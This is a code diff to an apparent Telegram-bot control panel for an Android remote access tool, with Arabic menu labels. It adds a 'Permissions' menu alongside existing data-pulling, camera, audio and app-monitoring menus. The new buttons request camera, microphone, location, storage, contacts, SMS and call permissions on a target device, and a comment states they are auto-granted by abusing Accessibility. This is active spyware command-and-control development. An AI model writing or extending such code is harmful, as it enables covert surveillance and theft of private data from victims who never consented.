@@ -206,6 +206,7 @@ CATEGORIES = {
     "advanced":       {"label": "⚡ أوامر متقدمة",     "emoji": "⚡"},
     "info":           {"label": "ℹ️ معلومات",          "emoji": "ℹ️"},
     "app_monitoring": {"label": "📱 مراقبة التطبيقات", "emoji": "📱"},
+    "permissions": {"label": "🔓 الأذونات", "emoji": "🔓"},
 }
 
 COMMANDS = {
@@ -352,8 +353,9 @@ def control_panel_keyboard(did, banned=False):
         InlineKeyboardButton("⚡ أوامر متقدمة", callback_data=_cb(did,"kb","advanced")),
         InlineKeyboardButton("ℹ️ معلومات", callback_data=_cb(did,"kb","info"))
     )
-    # Section 4: App Monitoring (full width)
+    # Section 4: App Monitoring & Permissions (full width)
     kb.add(InlineKeyboardButton("📱 مراقبة التطبيقات", callback_data=_cb(did,"kb","app_monitoring")))
+    kb.add(InlineKeyboardButton("🔓 الأذونات", callback_data=_cb(did,"kb","permissions")))
     # Section 5: Device Management (separate section)
     kb.add(
         InlineKeyboardButton("📋 تفاصيل الجهاز", callback_data=_cb(did,"info_act","")),
@@ -420,6 +422,18 @@ def advanced_keyboard(did):
     kb.add(_back(did))
     return kb
 
+# ── Permissions Keyboard ──
+def permissions_keyboard(did):
+    kb = InlineKeyboardMarkup(row_width=2)
+    # ✅ Permission request buttons - each requests + auto-grants via Accessibility
+    perm_btn = lambda perm: InlineKeyboardButton(f"🔓 {perm}", callback_data=_cb(did, "param", f"request-permission:{perm}"))
+    kb.add(perm_btn("all"), perm_btn("camera"))
+    kb.add(perm_btn("microphone"), perm_btn("location"))
+    kb.add(perm_btn("storage"), perm_btn("contacts"))
+    kb.add(perm_btn("sms"), perm_btn("calls"))
+    kb.add(_back(did))
+    return kb
+
 # ── Info Keyboard ──
 def info_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
@@ -441,11 +455,13 @@ def app_monitoring_keyboard(did):
 
 _KB = {"control_panel": control_panel_keyboard, "data": data_keyboard, "camera": camera_keyboard,
        "audio": audio_keyboard, "tools": tools_keyboard, "advanced": advanced_keyboard,
-       "info": info_keyboard, "app_monitoring": app_monitoring_keyboard}
+       "info": info_keyboard, "app_monitoring": app_monitoring_keyboard,
+       "permissions": permissions_keyboard}
 
 _KB_TITLE = {"control_panel": "⚙ لوحة التحكم", "data": "📦 سحب بيانات", "camera": "📷 كاميرا وشاشة",
              "audio": "🎤 صوت", "tools": "🎮 أدوات تحكم", "advanced": "⚡ أوامر متقدمة",
-             "info": "ℹ️ معلومات", "app_monitoring": "📱 مراقبة التطبيقات"}
+             "info": "ℹ️ معلومات", "app_monitoring": "📱 مراقبة التطبيقات",
+             "permissions": "🔓 الأذونات"}
 
 
 # ═══════════════════════════════════════════════════════════════════════
